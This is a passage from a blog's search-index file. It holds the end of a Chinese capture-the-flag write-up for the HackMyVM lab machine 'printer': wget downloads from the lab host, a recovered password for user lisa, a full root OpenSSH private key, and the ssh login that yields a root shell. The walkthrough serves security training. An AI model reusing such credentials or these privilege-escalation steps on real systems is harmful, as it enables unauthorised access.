+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">wget</span> http://192.168.56.191:6677/18358014
+
+--2024-06-30 <span class="token number">19</span>:46:13--  http://192.168.56.191:6677/18358014
+Connecting to <span class="token number">192.168</span>.56.191:6677<span class="token punctuation">..</span>. connected.
+HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
+Length: <span class="token number">7921</span> <span class="token punctuation">(</span><span class="token number">7</span>.7K<span class="token punctuation">)</span> <span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span>
+Saving to: ‘18358014’
+
+<span class="token number">18358014</span>                                                   <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span><span class="token punctuation">]</span>   <span class="token number">7</span>.74K  --.-KB/s    <span class="token keyword">in</span> 0s      
+
+<span class="token number">2024</span>-06-30 <span class="token number">19</span>:46:13 <span class="token punctuation">(</span><span class="token number">1.22</span> GB/s<span class="token punctuation">)</span> - ‘18358014’ saved <span class="token punctuation">[</span><span class="token number">7921</span>/7921<span class="token punctuation">]</span>
+<span class="token operator">></span> <span class="token function">wget</span> http://192.168.56.191:6677/21581476
+
+
+--2024-06-30 <span class="token number">19</span>:46:22--  http://192.168.56.191:6677/21581476
+Connecting to <span class="token number">192.168</span>.56.191:6677<span class="token punctuation">..</span>. connected.
+HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
+Length: <span class="token number">13699</span> <span class="token punctuation">(</span>13K<span class="token punctuation">)</span> <span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span>
+Saving to: ‘21581476’
+
+<span class="token number">21581476</span>                                                   <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span><span class="token punctuation">]</span>  <span class="token number">13</span>.38K  --.-KB/s    <span class="token keyword">in</span> 0s      
+
+<span class="token number">2024</span>-06-30 <span class="token number">19</span>:46:23 <span class="token punctuation">(</span><span class="token number">1.94</span> GB/s<span class="token punctuation">)</span> - ‘21581476’ saved <span class="token punctuation">[</span><span class="token number">13699</span>/13699<span class="token punctuation">]</span></code></pre>
+<p><img src="https://ooo.0x0.ooo/2024/06/30/OPr0FG.png" alt="OPr0FG.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/30/OPrcR1.png" alt="OPrcR1.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/30/OPrd9I.png" alt="OPrd9I.png" loading="lazy"><br>拿到lisa的密码<code>1154p455!1</code><br>解压拿到root的私钥</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span>.
+<span class="token punctuation">..</span>.
+<span class="token punctuation">..</span>.
+Jun <span class="token number">30</span> <span class="token number">21</span>:37:01 printer CRON<span class="token punctuation">[</span><span class="token number">2320</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>cron:session<span class="token punctuation">)</span>: session closed <span class="token keyword">for</span> user root
+Jun <span class="token number">30</span> <span class="token number">21</span>:38:01 printer CRON<span class="token punctuation">[</span><span class="token number">2367</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>cron:session<span class="token punctuation">)</span>: session opened <span class="token keyword">for</span> user root<span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> by <span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
+Jun <span class="token number">30</span> <span class="token number">21</span>:38:01 printer CRON<span class="token punctuation">[</span><span class="token number">2367</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>cron:session<span class="token punctuation">)</span>: session closed <span class="token keyword">for</span> user root
+Jun <span class="token number">30</span> <span class="token number">21</span>:39:01 printer CRON<span class="token punctuation">[</span><span class="token number">2419</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>cron:session<span class="token punctuation">)</span>: session opened <span class="token keyword">for</span> user root<span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> by <span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
+Jun <span class="token number">30</span> <span class="token number">21</span>:39:01 printer CRON<span class="token punctuation">[</span><span class="token number">2419</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>cron:session<span class="token punctuation">)</span>: session closed <span class="token keyword">for</span> user root
+Jun <span class="token number">30</span> <span class="token number">21</span>:40:01 printer CRON<span class="token punctuation">[</span><span class="token number">2468</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>cron:session<span class="token punctuation">)</span>: session opened <span class="token keyword">for</span> user root<span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> by <span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
+���cpts/0192.168.0.10��fpts/0192.168.56.104-----BEGIN OPENSSH PRIVATE KEY-----
+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<span class="token operator">==</span>
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">lisa@printer:/tmp$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> aaa root@127.0.0.1
+The authenticity of <span class="token function">host</span> <span class="token string">'127.0.0.1 (127.0.0.1)'</span> can<span class="token string">'t be established.
+ECDSA key fingerprint is SHA256:FitnTYgF2Gb7AOjP0rYyTm7fvOjnP5NM/1zJUXfxnms.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span><span class="token number">127.0</span>.0.1' <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span> to the list of known hosts.
+Linux printer <span class="token number">5.10</span>.0-20-amd64 <span class="token comment">#1 SMP Debian 5.10.158-2 (2022-12-13) x86_64</span>
+
+The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
+the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
+individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jan <span class="token number">25</span> 07:28:04 <span class="token number">2023</span> from <span class="token number">192.168</span>.0.10
+root@printer:~<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
+<p>拿到root。</p>
+]]></content>
+      <categories>
+        <category>HackMyVM</category>
+      </categories>
+      <tags>
+        <tag>软连接</tag>
+        <tag>nfs</tag>
+        <tag>打印机</tag>
+      </tags>
+  </entry>
 </search>
